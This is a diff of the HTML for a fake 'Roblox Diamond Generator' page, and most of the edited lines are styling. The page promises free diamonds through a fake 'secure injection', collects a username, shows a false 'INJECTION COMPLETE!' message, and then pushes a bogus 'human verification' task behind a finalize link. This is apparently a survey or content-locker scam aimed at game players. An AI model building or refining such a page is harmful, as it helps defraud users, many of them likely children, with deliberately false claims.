@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Diamond Generator - Fast & Secure</title>
+    <title>Roblox Diamond Generator - Secure Access</title>
     <!-- Load Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Load Inter Font -->
@@ -11,16 +11,19 @@
     <style>
         /* Custom Tailwind Configuration */
         :root {
-            --color-primary: #1E40FF; /* Strong Blue for action */
-            --color-accent: #059669; /* Darker Green for trust/success */
+            --color-primary: #1E40FF; /* Strong Blue for action (Deep Blue) */
+            --color-accent: #10B981; /* Accent Green for success/trust */
+            --color-light-blue-body: #F0F9FF; /* Very Pale Blue for page body (off-white blue) */
+            --color-light-blue-card: #E0F7FA; /* Slightly deeper pale blue for generator box */
         }
 
-        /* Applying the requested light background gradient (NOT white) and dark text */
+        /* Applying the requested light blue background gradient */
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #E0F7FA, #F0F9FF); /* Light Cyan/Blue Gradient */
+            /* Very light blue gradient (not pure white) */
+            background: linear-gradient(135deg, var(--color-light-blue-body), #CBE7F5); 
             min-height: 100vh;
-            color: #333333; /* Dark text on light background */
+            color: #1F2937; /* Dark text on light background */
             padding-bottom: 20px; 
             overflow-x: hidden;
         }
@@ -31,7 +34,7 @@
         .bg-accent { background-color: var(--color-accent); }
         .border-primary { border-color: var(--color-primary); }
         .shadow-primary-lg { box-shadow: 0 10px 20px rgba(30, 64, 255, 0.4); }
-        .shadow-accent-lg { box-shadow: 0 10px 20px rgba(5, 150, 105, 0.4); }
+        .shadow-accent-lg { box-shadow: 0 10px 20px rgba(16, 185, 129, 0.4); }
 
         /* Keyframe for button pulse effect */
         @keyframes pulse-ring {
@@ -50,7 +53,7 @@
             cursor: pointer;
             border: 2px solid transparent;
             padding: 8px; /* Reduced padding */
-            background-color: #F8F8F8; /* Very light gray card background */
+            background-color: var(--color-light-blue-body); /* Pale blue card background */
         }
 
         .selection-card:hover {
@@ -60,9 +63,9 @@
 
         .selection-card.selected {
             border-color: var(--color-accent);
-            background-color: rgba(5, 150, 105, 0.1);
+            background-color: rgba(16, 185, 129, 0.1);
             transform: scale(1.05);
-            box-shadow: 0 0 15px rgba(5, 150, 105, 0.6);
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.6);
         }
 
         .resource-grid {
@@ -82,14 +85,14 @@
         /* Dark console box for contrast */
         .console-box {
             background-color: #1F2937; 
-            color: #34D399; /* Light green text */
+            color: #A7F3D0; /* Light green text on dark console */
         }
     </style>
 </head>
 <body class="selection:bg-accent selection:text-[#1A1A1A]">
 
     <!-- Header Section (Trust Indicators) -->
-    <header class="p-4 bg-white bg-opacity-90 shadow-xl border-b border-primary/20 sticky top-0 z-40 text-gray-900">
+    <header class="p-4 bg-white/70 shadow-xl border-b border-primary/20 sticky top-0 z-40 text-gray-900">
         <div class="max-w-4xl mx-auto">
             <div class="flex items-center justify-between flex-wrap gap-4">
                 <h1 class="text-2xl font-extrabold text-primary">ROBLOX GENERATOR</h1>
@@ -113,14 +116,14 @@
     <main class="max-w-4xl mx-auto p-4 md:p-8">
 
         <!-- Generator Steps Container -->
-        <div id="generator-steps" class="bg-white p-4 md:p-8 rounded-2xl shadow-2xl border-2 border-primary/20">
+        <div id="generator-steps" class="bg-color-light-blue-card p-4 md:p-8 rounded-2xl shadow-2xl border-2 border-primary/20">
 
             <!-- Step 1: Selection & Input (Combined) -->
             <div id="step-select" class="step-content text-gray-900">
                 <h2 class="text-3xl font-extrabold mb-2 text-center text-gray-900">
                     Acquire Resources in <span class="text-primary">3 Steps</span>
                 </h2>
-                <p class="text-gray-500 mb-6 text-center text-sm">Select your desired bundle and start the secure injection process.</p>
+                <p class="text-gray-600 mb-6 text-center text-sm">Select your desired bundle and start the secure injection process.</p>
 
                 <!-- Resource Selection Grid -->
                 <div class="space-y-6">
@@ -131,15 +134,15 @@
                         </h3>
                         <div class="resource-grid grid grid-cols-3">
                             <div class="selection-card rounded-lg" data-resource="diamonds" data-value="2500" onclick="selectResource(this, 'diamonds')">
-                                <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="mx-auto mb-1 rounded-full p-0.5 bg-white border border-accent/50">
+                                <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="mx-auto mb-1 rounded-full p-0.5 bg-gray-100 border border-accent/50">
                                 <p class="font-bold text-center text-gray-800">2,500</p>
                             </div>
                             <div class="selection-card rounded-lg" data-resource="diamonds" data-value="5000" onclick="selectResource(this, 'diamonds')">
-                                <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="mx-auto mb-1 rounded-full p-0.5 bg-white border border-accent/50">
+                                <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="mx-auto mb-1 rounded-full p-0.5 bg-gray-100 border border-accent/50">
                                 <p class="font-bold text-center text-gray-800">5,000</p>
                             </div>
                             <div class="selection-card rounded-lg" data-resource="diamonds" data-value="10000" onclick="selectResource(this, 'diamonds')">
-                                <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="mx-auto mb-1 rounded-full p-0.5 bg-white border border-accent/50">
+                                <img src="https://i.postimg.cc/Yqqf09rG/lv-0-20250925233726.jpg" alt="Diamond" class="mx-auto mb-1 rounded-full p-0.5 bg-gray-100 border border-accent/50">
                                 <p class="font-bold text-center text-gray-800">10,000</p>
                             </div>
                         </div>
@@ -193,7 +196,7 @@
                             👤 4. Enter Roblox Username
                         </h3>
                         <input type="text" id="roblox-username" placeholder="Your Roblox Username (No Password Required)" 
-                               class="w-full p-3 text-lg bg-gray-100 border-2 border-primary/50 rounded-xl text-gray-900 placeholder-gray-500 focus:border-accent focus:ring-2 focus:ring-accent/50 outline-none transition" required>
+                               class="w-full p-3 text-lg bg-gray-200 border-2 border-primary/50 rounded-xl text-gray-900 placeholder-gray-500 focus:border-accent focus:ring-2 focus:ring-accent/50 outline-none transition" required>
                         <p id="username-error" class="text-red-600 text-sm mt-2 hidden">Please enter a valid username.</p>
                     </div>
 
@@ -229,14 +232,14 @@
             <div id="step-verify" class="step-content hidden text-center text-gray-900">
                 <div class="text-6xl mb-4 text-accent">✅</div>
                 <h2 class="text-4xl font-extrabold text-primary mb-4">INJECTION COMPLETE!</h2>
-                <p class="text-gray-600 mb-8 max-w-lg mx-auto">
+                <p class="text-gray-700 mb-8 max-w-lg mx-auto">
                     Your **<span id="verify-diamonds" class="text-primary font-bold">10,000</span> Diamonds** and items are ready for transfer. Complete a quick verification to finalize the injection.
                 </p>
 
                 <!-- Security/Verification Block -->
-                <div class="bg-red-50 p-5 rounded-xl border border-red-500 mb-8 max-w-sm mx-auto">
+                <div class="bg-red-100 p-5 rounded-xl border border-red-500 mb-8 max-w-sm mx-auto">
                     <h4 class="font-bold text-xl mb-3 text-red-600">🚨 Required: Human Verification</h4>
-                    <p class="text-sm text-gray-700">
+                    <p class="text-sm text-gray-800">
                         This is necessary to protect our servers from automated bots. Click the button below and complete one quick task to prove you are human.
                     </p>
                 </div>
@@ -249,7 +252,7 @@
                     🔒 FINALIZE & GET RESOURCES NOW
                 </a>
 
-                <p class="text-xs text-gray-500 mt-6">
+                <p class="text-xs text-gray-600 mt-6">
                     (Your resources will be automatically added to account **<span id="verify-username"></span>** after verification.)
                 </p>
             </div>
@@ -259,7 +262,7 @@
     </main>
 
     <!-- Footer Section -->
-    <footer class="p-4 bg-white bg-opacity-90 border-t border-primary/20 text-center mt-8 text-gray-600">
+    <footer class="p-4 bg-white/70 border-t border-primary/20 text-center mt-8 text-gray-600">
         <div class="flex justify-center space-x-6 text-sm mb-2">
             <span>High Success Rate</span>
             <span>|</span>
